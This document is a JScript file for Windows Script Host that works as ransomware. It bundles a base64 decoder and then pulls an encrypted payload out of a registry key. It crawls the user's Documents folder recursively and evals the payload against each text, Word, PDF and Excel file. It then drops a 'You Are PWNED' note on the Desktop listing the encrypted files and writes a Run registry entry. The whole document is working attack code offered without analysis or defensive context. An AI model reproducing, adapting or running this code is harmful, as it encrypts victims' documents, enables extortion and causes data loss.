//Base64 Decoder
var base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';base64.makeDOMException=function(){var e,tmp;try{return new DOMException(DOMException.INVALID_CHARACTER_ERR)}catch(tmp){var ex=new Error('DOM Exception 5');ex.code=ex.number=5;ex.name=ex.description='INVALID_CHARACTER_ERR';ex.toString=function(){return'Error: '+ex.name+': '+ex.message};return ex}};base64.getbyte64=function(s,i){var idx=base64.ALPHA.indexOf(s.charAt(i));if(idx===-1){throw base64.makeDOMException();}return idx};base64.decode=function(s){s=''+s;var getbyte64=base64.getbyte64;var pads,i,b10;var imax=s.length;if(imax===0){return s}if(imax%4!==0){throw base64.makeDOMException();}pads=0;if(s.charAt(imax-1)===base64.PADCHAR){pads=1;if(s.charAt(imax-2)===base64.PADCHAR){pads=2}imax-=4}var x=[];for(i=0;i<imax;i+=4){b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff))}switch(pads){case 1:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));break;case 2:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);x.push(String.fromCharCode(b10>>16));break}return x.join('')};base64.getbyte=function(s,i){var x=s.charCodeAt(i);if(x>255){throw base64.makeDOMException();}return x};base64.encode=function(s){if(arguments.length!==1){throw new SyntaxError('Not enough arguments');}var padchar=base64.PADCHAR;var alpha=base64.ALPHA;var getbyte=base64.getbyte;var i,b10;var x=[];s=''+s;var imax=s.length-s.length%3;if(s.length===0){return s}for(i=0;i<imax;i+=3){b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8)|getbyte(s,i+2);x.push(alpha.charAt(b10>>18));x.push(alpha.charAt((b10>>12)&0x3F));x.push(alpha.charAt((b10>>6)&0x3f));x.push(alpha.charAt(b10&0x3f))}switch(s.length-imax){case 1:b10=getbyte(s,i)<<16;x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+padchar+padchar);break;case 2:b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8);x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+alpha.charAt((b10>>6)&0x3f)+padchar);break}return x.join('')};
//
var encryptor;
var personalFolderRegistryEntry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal';
var encryptorRegistryEntry = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\e';
var fileNameToEncryptVar = 'fileNameToEncrypt';
var processFlagReg = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\PWNED';
var fso = new ActiveXObject('Scripting.FileSystemObject');
var fileExtList = { 
	txt : 'txt', 
	doc : 'doc', 
	docx : 'docx', 
	pdf : 'pdf', 
	xls : 'xls', 
	xlsx : 'xlsx', 
	xlsm : 'xlsm'
};

var pwnedFileList = [];

function getFileExt(fileShortName) {
	if(fileShortName.indexOf('.') > -1) {
		return fileShortName.split('.').pop().toLowerCase();
	} else {
		return false;
	}
};

function isValidExt(fileShortName) {
	var ext = getFileExt(fileShortName);
	return ext ? fileExtList[ext] : false;
};

function getFiles(folderPath) {
	var folder = fso.GetFolder(folderPath);
	var files = folder.files;
	if(files.count > 0) {
  	var fileList = new Enumerator(folder.files);
  	for (; !fileList.atEnd(); fileList.moveNext()) {
			try {
				if(isValidExt(fileList.item().ShortName)) {
					pwnedFileList.push(fileList.item().path);
					var evalString = 'var '+fileNameToEncryptVar+' = \''+fileList.item().path.replace(/\\/g, '\\\\')+'\';' + encryptor;
					eval(evalString);
				}
			} catch(err) {}
		}
	}
};

function getFolders(path) {
	var folder = fso.GetFolder(path);
	var subFolders = folder.SubFolders;
	if(subFolders.count > 0) {
		var folderList = new Enumerator(subFolders);
		for (; !folderList.atEnd(); folderList.moveNext()) {
			try {
				getFolders(folderList.item());
			} catch(err) {}
		}
	}
	getFiles(path);
};

function finish() {
	if(pwnedFileList.length > 0) {
		var wsh = new ActiveXObject('WScript.Shell');
		var path = wsh.RegRead('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Desktop') + '\\You Are PWNED.html';
		var htmlBody = '<html><head><title>You have been PWNED !!!!!!!</title></head><body><h1>You Have been PWNED by ME !!!!</h1><h3>Following files are encrypted</h3><p>'+	pwnedFileList.join('<br/>') +'</p></body></html>';
		var a = fso.CreateTextFile(path, true);
		a.WriteLine(htmlBody);
		a.Close();
		wsh.RegWrite(processFlagReg, path, "REG_SZ");
	}
};

function isAleardyPwned() {
	try {
		var wsh = new ActiveXObject('WScript.Shell');
		var val = wsh.RegRead(processFlagReg);
		return val != '';
	} catch(err) {}
	return false;
};
function getDocumentFolder() {
	if(isAleardyPwned() == false) {
		var wsh = new ActiveXObject('WScript.Shell');
		var path = wsh.RegRead(personalFolderRegistryEntry);
		encryptor = base64.decode(wsh.RegRead(encryptorRegistryEntry));
		getFolders(path);
		finish();
	}
};
getDocumentFolder();